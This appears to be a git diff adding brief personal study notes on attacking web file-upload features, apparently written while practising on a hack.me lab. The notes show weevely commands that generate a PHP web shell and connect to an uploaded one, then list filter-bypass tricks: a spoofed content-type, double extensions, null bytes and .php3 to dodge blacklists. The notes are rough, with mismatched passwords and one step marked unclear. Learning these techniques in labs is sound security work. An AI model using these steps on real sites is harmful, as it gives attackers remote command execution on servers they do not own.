@@ -1,0 +1,26 @@
+
+
+File Uploads 
+
+in file Upload you have to upload shell in web app 
+
+to make shell Use  weevely tools this is inbuilt tools available in parrot os 
+
+weevely generate 123456 /Desktop/shell.py    # 12345 is a password 
+
+
+weevely URL Password 
+weevely http://s136923-101047-778.sipontum.hack.me/hackable/uploads/shell2.php.jpg 12345  #expolitation 
+
+then run any linux command
+
+to bypass the filter 
+check headers 
+content-type: image/Png 
+filename : shell.php.png    #at the time checking extension
+
+add Null Byte in filenam  -- shell.php           # not clear where
+
+BlackListing file-extension
+if .php in blacklisted use .php3
+
